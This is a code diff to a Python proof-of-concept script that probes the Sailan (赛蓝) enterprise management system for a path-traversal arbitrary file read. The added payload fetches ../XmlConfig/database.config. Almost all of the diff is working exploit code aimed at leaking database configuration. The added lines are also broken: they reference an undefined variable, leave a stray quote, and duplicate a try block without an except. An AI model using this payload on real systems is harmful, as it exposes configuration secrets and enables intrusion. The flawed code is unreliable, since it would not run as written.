@@ -16,7 +16,13 @@ def banner():
 
 
 def poc(target):
-    payload = "/BaseModule/ReportManage/DownloadBuilder?filename=/../web.config"
+    payload = "/BaseModule/SysLog/ReadTxtLog?FileName=../XmlConfig/database.config"
+    try:
+        response = requests.get(url + payload, timeout=10,verify=False)
+        if "<configuration>" in response.text:
+            print(f"[+] {url} is vulnerable to Vuln 21 (赛蓝企业管理系统 DownloadBuilder 任意文件读取漏洞)")
+        else:
+            print(f"[-] {url} is not vulnerable to Vuln 21")"
     try:
         response = requests.get(target + payload, timeout=10, verify=False)
         if "<configuration>" in response.text:
